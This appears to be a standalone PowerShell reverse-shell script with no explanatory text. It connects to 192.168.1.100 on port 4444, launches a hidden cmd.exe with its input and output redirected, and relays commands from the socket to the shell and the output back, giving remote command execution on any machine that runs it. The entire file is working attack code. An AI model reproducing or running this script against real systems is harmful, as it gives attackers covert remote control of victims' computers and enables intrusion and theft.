
 $target = "192.168.1.100"
 $port = 4444

 $client = [System.Net.Sockets.TcpClient]::new($target, $port)
 $stream = $client.GetStream()
 $reader = New-Object System.IO.StreamReader($stream)
 $writer = New-Object System.IO.StreamWriter($stream)
 $writer.AutoFlush = $true

 $proc = New-Object System.Diagnostics.Process
 $proc.StartInfo.FileName = "cmd.exe"
 $proc.StartInfo.UseShellExecute = $false
 $proc.StartInfo.RedirectStandardInput = $true
 $proc.StartInfo.RedirectStandardOutput = $true
 $proc.StartInfo.RedirectStandardError = $true
 $proc.StartInfo.CreateNoWindow = $true
 $proc.Start()

 $procInput = $proc.StandardInput
 $procOutput = $proc.StandardOutput
 $procError = $proc.StandardError

# Async read loops to avoid deadlock
 $runspace = [runspacefactory]::CreateRunspace()
 $runspace.Open()

 $ps = [powershell]::Create()
 $ps.Runspace = $runspace

 $null = $ps.AddScript({
    param($s, $w, $out, $err)
    $buf = New-Object byte[] 4096
    while ($s.Connected) {
        Start-Sleep -Milliseconds 50
        while ($out.Peek() -ge 0) {
            $ch = $out.Read()
            $w.Write([char]$ch)
        }
        while ($err.Peek() -ge 0) {
            $ch = $err.Read()
            $w.Write([char]$ch)
        }
    }
}).AddArgument($stream).AddArgument($writer).AddArgument($procOutput).AddArgument($procError)

 $handle = $ps.BeginInvoke()

# Main loop: read from socket, write to cmd
 $buffer = New-Object byte[] 4096
while ($stream.DataAvailable -or $true) {
    if ($stream.DataAvailable) {
        $read = $stream.Read($buffer, 0, $buffer.Length)
        $cmd = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read).TrimEnd("`r", "`n")
        $procInput.WriteLine($cmd)
        if ($cmd -eq "exit") { break }
    }
    if (-not $client.Connected) { break }
    Start-Sleep -Milliseconds 50
}

 $proc.Kill()
 $ps.Stop()
 $runspace.Close()
 $client.Close()
